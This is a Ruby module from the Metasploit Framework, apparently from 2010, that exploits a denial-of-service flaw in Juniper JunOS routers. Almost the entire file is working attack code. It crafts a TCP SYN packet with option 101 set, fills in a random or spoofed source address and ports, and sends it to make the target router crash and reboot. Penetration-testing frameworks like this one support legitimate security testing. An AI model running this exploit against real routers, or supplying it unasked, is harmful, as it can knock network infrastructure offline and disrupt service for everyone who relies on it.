##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Dos

	# The whole point is to cause a router crash.
	Rank = LowRanking

	def initialize
		super(
			'Name'        => 'Juniper JunOS Malformed TCP Option',
			'Description' => %q{ This module exploits a denial of service vulnerability in Juniper Network's JunOS router operating system. By sending a TCP packet with TCP option 101 set, an attacker can cause an affected router to reboot.
				},
			'Author'      => 'todb',
			'License'     => MSF_LICENSE,
			'References' =>
				[
					['BID', '37670'],
					['OSVDB', '61538'],
					['URL','http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/']
				],
			'Version'     => '$$' # 02/02/2010
		)

		register_options([
			OptInt.new('RPORT', [false, 'The destination port (defaults to random)']),
			OptInt.new('SPORT', [false, 'Source port (defaults to random)']),
			OptAddress.new('SHOST', [false, 'Source address (defaults to random)'])
		])
		
		deregister_options('FILTER','PCAPFILE', 'SNAPLEN')
	end

	def rport
		datastore['RPORT'].to_i.zero? ? rand(0xffff) : datastore['RPORT'].to_i
	end

	def sport
		datastore['SPORT'].to_i.zero? ? rand(0xffff) : datastore['SPORT'].to_i
	end

	def shost
		datastore['SHOST'] || IPAddr.new(rand(0xffffffff), Socket::AF_INET).to_s
	end

	def run

		open_pcap


		n = Racket::Racket.new
		n.l3 = Racket::L3::IPv4.new
		n.l3.dst_ip = rhost
		n.l3.src_ip = shost
		n.l3.protocol = 6
		n.l3.id = rand(0xffff)
		n.l3.ttl = rand(128) + 128
		n.l4 = Racket::L4::TCP.new
		n.l4.src_port = sport
		n.l4.dst_port = rport
		n.l4.flag_syn = 1
		n.l4.window = rand(4096)+1
		n.l4.ack = 0
		n.l4.seq = rand(0xffffffff)
		n.l4.add_option(101,"")
		n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, '')	
		pkt = n.pack
		print_status("#{n.l3.dst_ip}:#{n.l4.dst_port} Sending TCP Syn packet from #{n.l3.src_ip}:#{n.l4.src_port}")
		capture_sendto(pkt,rhost)
		close_pcap
	end
end

